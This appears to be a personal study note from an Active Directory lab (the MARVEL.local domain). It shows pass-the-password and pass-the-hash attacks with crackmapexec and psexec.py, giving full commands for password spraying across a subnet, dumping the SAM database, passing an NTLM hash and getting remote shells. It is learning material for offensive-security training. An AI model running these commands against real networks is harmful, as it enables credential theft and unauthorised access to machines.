1. Passing the plaintext password with crackmapexec:
![[AD_post1.png]]

2. Dumping hashes using metasploit:
![[AD_post2.png]]

3. Passing the hash using crackmapexec:
![[AD_post3.png]]

**Installing crackmapexec**
```python
sudo apt install crackmapexec
```

## Practical implementation of pass the password attack in lab 
**Scenario** - Now, we are trying to dump sam database as well as try to get a shell in fcastle machine

1. Help menu of crackmapexec:
```python
crackmapexec --help
```

2. Spraying password and try to see if we can get login into some machines
command - 
```python
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1
```

![[AD_post4.png]]

3. Dumping sam database hashes
command - 
```python
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```
![[AD_post5.png]]

4. Getting a shell in 192.168.1.16 using psexec.py
command - 
```python
psexec.py marvel/fcastle:Password1@192.168.1.16
```

![[AD_post6.png]]

## Practical implementation of pass the hash attack in lab 
1. First we grab hashes as well as username from hashes file(we get this hashes from secretsdump.py)
![[AD_post8.png]]

2. Now, we pass the hash around the defined network using crackmapexec.
command - 
```python
crackmapexec smb 192.168.1.0/24 -u "Peter Parker" -H aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0 --local-auth
```

![[AD_post9.png]]

3. Now, we can use psexec to get a shell in this machine.

## Pass the password or hash:
![[AD_post10.png]]

